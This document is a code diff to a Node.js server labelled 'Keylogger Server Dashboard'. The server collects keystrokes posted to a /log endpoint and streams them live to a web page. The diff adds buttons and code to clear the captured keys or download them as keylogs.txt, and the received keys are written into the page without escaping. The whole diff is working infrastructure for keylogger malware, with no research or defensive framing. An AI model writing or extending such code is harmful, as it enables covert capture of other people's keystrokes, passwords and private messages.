@@ -59,6 +59,33 @@ app.get("/", (req, res) => {
                 font-size: 1.1rem;
                 line-height: 1.5;
             }
+            .btn-clear {
+                background-color: #d73a49;
+                color: white;
+                padding: 10px 15px;
+                border: none;
+                border-radius: 5px;
+                margin-bottom: 10px;
+                cursor: pointer;
+                font-size: 1rem;
+                margin-right: 10px;
+            }
+            .btn-clear:hover {
+                background-color: #b92534;
+            }
+            .btn-download {
+                background-color: #238636;
+                color: white;
+                padding: 10px 15px;
+                border: none;
+                border-radius: 5px;
+                margin-bottom: 10px;
+                cursor: pointer;
+                font-size: 1rem;
+            }
+            .btn-download:hover {
+                background-color: #196c2e;
+            }
             footer {
                 margin-top: 20px;
                 padding: 10px;
@@ -81,13 +108,40 @@ app.get("/", (req, res) => {
         <script src="/socket.io/socket.io.js"></script>
         <script>
             const socket = io();
+            let allKeys = [];
+            const logElement = document.getElementById("log");
+
             socket.on("updateKeys", (keys) => {
+                allKeys = keys;
                 const logElement = document.getElementById("log");
                 logElement.innerHTML = keys.length 
                     ? keys.map(k => '<span class="log-entry">' + k + '</span>').join(" ")
                     : "<i>No keys logged yet.</i>";
                 logElement.scrollTop = logElement.scrollHeight;
             });
+
+            function clearLogs() {
+                if (confirm("Are you sure you want to clear all logged keys?")) {
+                    fetch("/clear", { method: "POST" })
+                        .then(() => console.log("Logs cleared"))
+                        .catch(err => console.error(err));
+                }
+            }
+
+            function downloadLogs() {
+                if(allKeys.length === 0) {
+                    alert("No logs to download.");
+                    return;
+                }
+                const text = allKeys.join(" ");
+                const blob = new Blob([text], {type: "text/plain"});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "keylogs.txt";
+                a.click();
+                URL.revokeObjectURL(url);
+            }
         </script>
     </head>
     <body>
@@ -95,6 +149,8 @@ app.get("/", (req, res) => {
             <h1>🔐 Keylogger Server Dashboard</h1>
         </header>
         <main>
+            <button class="btn-clear" onclick="clearLogs()">🗑 Clear Logs</button>
+            <button class="btn-download" onclick="downloadLogs()">⬇ Download Logs</button>
             <div class="log-container" id="log">
                 <i>Waiting for keys...</i>
             </div>
@@ -120,6 +176,13 @@ app.post("/log", (req, res) => {
     const { key } = req.body;
     if (!key) return res.status(400).send("No key received.");
     keyLogs.push(key);
+    io.emit("updateKeys", keyLogs);
+    res.sendStatus(200);
+});
+
+// Endpoint to clear all logs
+app.post("/clear", (req, res) => {
+    keyLogs = [];
     io.emit("updateKeys", keyLogs);
     res.sendStatus(200);
 });
